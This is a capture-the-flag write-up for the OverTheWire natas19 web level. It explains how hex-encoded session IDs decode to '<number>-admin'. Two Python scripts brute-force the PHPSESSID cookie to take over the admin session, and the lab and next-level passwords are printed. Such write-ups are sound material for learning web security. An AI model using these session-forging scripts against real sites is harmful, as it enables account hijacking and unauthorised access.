
## Server URL
```
http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org
```

## Solution
We get a login box (Username and Password)

We don't get the source code but there is a mention in the page :
```
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
```

Hmmm, we could try to bruteforce the session id again. Not sure what are the implications of `session ids are no longer sequential`. 

Oh well, now i see, the session values looks like this `3536312d61`

We can't just bruteforce it like we did before.

What we can do tho is login repeatedly. This will generate a new random session id that has the valid structure.

We can then bruteforce using those session ids and retrieve an admin session.

By looking at the received session id we find that there is a suffix that change depending on the username. Since we want the admin session, we will use the `admin` username.

We get this suffix for the admin username : `d61646d696e`

The password doesn't seem to impact the session value.

The prefix always start with a `3` and finish with a `2`

We can do a bruteforce using those constraint.

Let's first try to use the cookie that we receive to see if we can get an authenticated session.

I've let it run for a while but I would only get regular user sessions.

Playing around with all the prefixes I received, I can confirm that every session id start with `3` and finish with `2`.

We received prefix of length `3`, `5` or `7` but they an be longer as long as they respect the `3?` pattern

For length `3` we get `3?2`

For length `5` we get `3?3?2`

For length `7` we get `3?3?3?2`

For length `9` we get `3?3?3?3?2`

and so on... Doesn't seems like there is an end to the amount of character we can have in the session id.

hmmm.. Bruteforcing this is kina long, Already bruteforced sessions ids with `7` or less character prefix with no success...

Running the search in parallel would definitely be more efficient..

Ok soo, I had it all wrong, still managed to find it via bruteforce (Had a problem in my combination generation).

I assumed that the session id was a unique identifier and didn't even try to interpret it as ascii bytes.

When converted, we get a string like :
```
XXX-admin
```

This is why the suffix stay the same when using a given username.
Should have realised that the repeating pattern `3?` is in fact numbers. The ascii representation of `0` is `30`, `2` is `32`, `9` is `39` ...

So here is the pure bruteforce approach (On encoded string)

```py
import requests
import itertools

url = "http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org"

admin_suffix = "d61646d696e"

count = 1
max_count = 5
while count < max_count:
    combinations = itertools.product(range(10), repeat=count)
    for combination in combinations:
        prefix = ""

        # Session start with 3? and repeat the same pattern
        for c in combination:
            prefix += f"3{c}"

        # Always finish with 2
        prefix += "2"
    
        session_id = f"{prefix}{admin_suffix}"
        r = requests.get(url, cookies={"PHPSESSID": session_id})

        invalid_session = "Please login" in r.text
        regular_user = "regular user" in r.text

        print(f"[{count}] Trying session id {session_id} -- {'Regular user' if regular_user else ''} {'Invalid session' if invalid_session else ''}")

        if not regular_user and not invalid_session:
            print("Found valid session id !")
            password = r.text.split('Password: ')[1].split("</pre>")[0]
            print(f"Natas20 password is {password}")
            exit(0)

    count += 1
```

And here is the approach when understanding the structure of the data :
```py
import requests
import binascii

url = "http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org"

max_id = 640
for i in range(max_id+1):   
    ascii_session_id = f"{i}-admin"
    session_id = binascii.hexlify(bytes(ascii_session_id, 'utf-8')).decode('utf-8')
    r = requests.get(url, cookies={"PHPSESSID": session_id})

    invalid_session = "Please login" in r.text
    regular_user = "regular user" in r.text

    print(f"Trying session id {ascii_session_id} -- {session_id} -- {'Regular user' if regular_user else ''} {'Invalid session' if invalid_session else ''}")

    if not regular_user and not invalid_session:
        print("Found valid session id !")
        print(r.text)
        password = r.text.split('Password: ')[1].split("</pre>")[0]
        print(f"Natas20 password is {password}")
        break
```

We get Natas20 password with both approach (The second approach is way faster)
```
eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
```
